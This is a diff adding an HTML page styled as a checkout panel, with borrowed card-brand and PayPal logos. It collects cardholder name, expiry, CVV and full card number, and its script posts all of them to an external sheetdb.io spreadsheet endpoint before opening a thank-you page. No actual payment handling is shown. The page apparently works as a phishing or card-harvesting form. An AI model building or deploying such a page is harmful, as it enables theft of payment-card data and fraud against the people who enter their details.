@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>checkout-panel</title>
+    <link href="card.css" rel="stylesheet" >
+</head>
+<body>
+
+  <form action="https://sheetdb.io/api/v1/ci1g3ib13y0h8"  method="POST"  id="sheetdb-form" >
+
+    <div class="checkout-panel">
+        <div class="panel-body">
+          <h2 class="title">Checkout</h2>
+       
+          <div class="progress-bar">
+            <div class="step active"></div>
+            <div class="step active"></div>
+            <div class="step"></div>
+            <div class="step"></div>
+          </div>
+       
+          <div class="payment-method">
+            <label for="card" class="method card">
+              <div class="card-logos">
+                <img src="https://99casinos.com/media/pages/visa-mastercard/7c7a6061f2-1590855853/visa-mastercard.png" height="100px"  width="200px" />
+                <img src=""/>
+              </div>
+       
+              <div class="radio-input">
+                <input id="card" type="radio" name=" data[visa-mastercard]">
+                Pay credit card
+              </div>
+            </label>
+       
+            <label for="paypal" class="method paypal">
+              <img src="https://newsroom.mastercard.com/wp-content/uploads/2016/09/paypal-logo.png"  height="100px"  width="200px" />
+              <div class="radio-input">
+                <input id="paypal" type="radio" name="data[PayPal]">
+                Pay PayPal
+              </div>
+            </label>
+          </div>
+       
+          <div class="input-fields">
+            <div class="column-1">
+              <label for="cardholder">Cardholder's Name</label>
+              <input type="text"  name="data[name]" id="cardholder" required />
+       
+              <div class="small-inputs">
+                <div>
+                  <label for="date">Valid thru</label>
+                  <input type="text"  name="data[date]" id="date" placeholder="MM / YY"  required />
+                </div>
+       
+                <div>
+                  <label for="verification">CVV / CVC *</label>
+                  <input type="password"  name="data[cvv]" id="verification"  required/>
+                </div>
+              </div>
+            </div>
+          
+            <div class="column-2">
+              <label for="cardnumber">Card Number</label>
+              <input type="password"  name="data[card no]" id="cardnumber" required />
+          
+            
+              <span class="info">* CVV or CVC is the card security code, unique three digits number on the back of your card separate from its number.</span>
+            </div>
+          </div>
+        </div>
+      </form>
+       
+        <div class="panel-footer">
+          <button class="btn back-btn">Back</button>
+          <button class="btn next-btn">Next Step</button>
+          
+        </div>
+      </div>
+
+  <script>
+        
+  var form = document.getElementById('sheetdb-form');
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(form.action, {
+        method : "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+    }).then(
+        response => response.json()
+    ).then((html) => {
+      // you can put any JS code here
+      window.open('thnx.html','_blank');
+     
+    });
+  });
+
+
+ </script>
+
+</body>
+</html>
